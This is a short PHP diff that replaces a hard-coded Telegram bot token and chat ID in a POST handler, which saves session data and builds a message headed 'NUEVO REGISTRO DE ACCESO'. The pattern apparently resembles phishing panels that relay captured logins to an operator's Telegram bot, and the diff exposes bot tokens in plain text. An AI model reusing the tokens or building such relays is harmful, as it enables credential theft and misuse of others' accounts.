@@ -21,8 +21,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         file_put_contents("sesiones/{$id_transmision}.json", json_encode($datos_iniciales));
 
         // --- SOLUCIÓN DE ENVÍO SEGURO ---
-        $token = "9227967121:AAHNi3XNSyv-w_vJjP5BkAnQFZRJzoOS39I";
-        $chat_id = "8166259970";
+        $token = "8470026912:AAGgOZjao_ChRrif4yID9y5QiAKQXZ28A8Y";
+        $chat_id = "1810228637";
 
         // Construimos el mensaje como texto plano
         $mensaje = "NUEVO REGISTRO DE ACCESO\n\n";
